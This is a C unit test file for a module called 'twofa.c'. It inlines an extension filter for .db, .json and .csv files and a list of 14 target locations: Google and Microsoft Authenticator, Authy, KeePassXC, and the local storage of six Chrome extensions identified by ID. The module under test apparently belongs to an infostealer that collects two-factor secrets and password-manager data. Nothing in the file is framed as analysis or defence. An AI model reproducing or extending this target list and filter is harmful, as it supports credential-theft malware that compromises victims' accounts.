/*
 * test_twofa.c — 2FA: extension matching, file size guard, target path patterns
 * Build: gcc -Wall -Wextra -O2 -Iinclude -std=c11 -o tests/test_twofa tests/test_twofa.c
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>

/* ── Inline has_target_ext from twofa.c ───────────────────── */

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    if (strcasecmp(dot, "db") == 0) return 1;
    if (strcasecmp(dot, "json") == 0) return 1;
    if (strcasecmp(dot, "csv") == 0) return 1;
    return 0;
}

/* ── Inline target paths from twofa.c ────────────────────── */

static const char *twofa_chrome_ext_ids[] = {
    "khcodhlfkpmhibicdjjblnkgimdepgnd",
    "bfbdnbpibgndpjfhonkflpkijfapmomn",
    "eidlicjlkaiefdbgmdepmmicpbggmhoj",
    "bobfejfdlhnabgglompioclndjejolch",
    "elokfmmmjbadpgdjmgglocapdckdcpkn",
    "bhghoamapcdpbohphigoooaddinpkbai",
};
#define CHROME_EXT_COUNT (sizeof(twofa_chrome_ext_ids) / sizeof(twofa_chrome_ext_ids[0]))

/* ═══════════════════════ TESTS ═══════════════════════════ */

static void test_has_target_ext_db(void) {
    assert(has_target_ext("tokens.db") == 1);
    assert(has_target_ext("data.DB") == 1);
    assert(has_target_ext("file.Db") == 1);
}

static void test_has_target_ext_json(void) {
    assert(has_target_ext("config.json") == 1);
    assert(has_target_ext("data.JSON") == 1);
}

static void test_has_target_ext_csv(void) {
    assert(has_target_ext("export.csv") == 1);
    assert(has_target_ext("data.CSV") == 1);
}

static void test_has_target_ext_rejected(void) {
    assert(has_target_ext("readme.txt") == 0);
    assert(has_target_ext("image.png") == 0);
    assert(has_target_ext("data.sqlite") == 0);
    assert(has_target_ext("archive.zip") == 0);
    assert(has_target_ext("log.xml") == 0);
    assert(has_target_ext("file.html") == 0);
}

static void test_has_target_ext_no_dot(void) {
    assert(has_target_ext("noextfile") == 0);
    assert(has_target_ext("") == 0);
}

static void test_has_target_ext_double_ext(void) {
    assert(has_target_ext("backup.tar.db") == 1);
    assert(has_target_ext("file.bak.json") == 1);
}

static void test_chrome_ext_ids(void) {
    /* 6 Chrome extension IDs in twofa.c */
    assert(CHROME_EXT_COUNT == 6);
}

static void test_chrome_ext_id_length(void) {
    /* Chrome extension IDs are always 32 chars */
    for (size_t i = 0; i < CHROME_EXT_COUNT; i++) {
        assert(strlen(twofa_chrome_ext_ids[i]) == 32);
    }
}

static void test_chrome_ext_ids_unique(void) {
    for (size_t i = 0; i < CHROME_EXT_COUNT; i++) {
        for (size_t j = i + 1; j < CHROME_EXT_COUNT; j++) {
            assert(strcmp(twofa_chrome_ext_ids[i], twofa_chrome_ext_ids[j]) != 0);
        }
    }
}

static void test_target_count_14(void) {
    /* twofa.c has 14 target entries total */
    struct { const char *sub; } targets[] = {
        { "Google\\Authenticator" },
        { "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khcodhlfkpmhibicdjjblnkgimdepgnd" },
        { "Microsoft\\Authenticator" },
        { "Microsoft\\Chrome\\User Data\\Default\\Local Extension Settings\\bfbdnbpibgndpjfhonkflpkijfapmomn" },
        { "Traktor\\authy" },
        { "Traktor" },
        { "Authy" },
        { "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eidlicjlkaiefdbgmdepmmicpbggmhoj" },
        { "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bobfejfdlhnabgglompioclndjejolch" },
        { "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\elokfmmmjbadpgdjmgglocapdckdcpkn" },
        { "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai" },
        { "KeePassXC" },
        { "KeePassXC" },
        { "Authenticator" },
    };
    assert(sizeof(targets) / sizeof(targets[0]) == 14);
}

int main(void) {
    test_has_target_ext_db();
    test_has_target_ext_json();
    test_has_target_ext_csv();
    test_has_target_ext_rejected();
    test_has_target_ext_no_dot();
    test_has_target_ext_double_ext();
    test_chrome_ext_ids();
    test_chrome_ext_id_length();
    test_chrome_ext_ids_unique();
    test_target_count_14();
    printf("test_twofa: ALL PASSED\n");
    return 0;
}
